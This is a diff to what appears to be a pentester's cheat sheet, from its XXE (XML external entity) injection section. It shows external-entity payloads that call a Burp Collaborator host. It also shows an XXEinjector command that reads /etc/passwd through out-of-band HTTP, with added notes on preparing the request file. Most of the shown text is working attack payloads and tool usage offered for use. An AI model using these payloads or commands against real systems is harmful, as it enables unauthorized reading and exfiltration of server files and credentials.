@@ -431,7 +431,11 @@ can put "http://collaborator_ip" in <!ENTITY xxe SYSTEM "http://collaborator">
  [<!ENTITY % xxe SYSTEM "https://burpcollaborator"> %xxe]     automatically without &xxe
   
   XXEinjector	==> best injection xxe tool ==> https://github.com/hossamshady/XXEinjector
-ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter	==> xxe.req is file with request and delete the body xml and leave only 
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+		-------------
+
 
 --------------------------------------------------------------------------------------------
                                        information disclosure
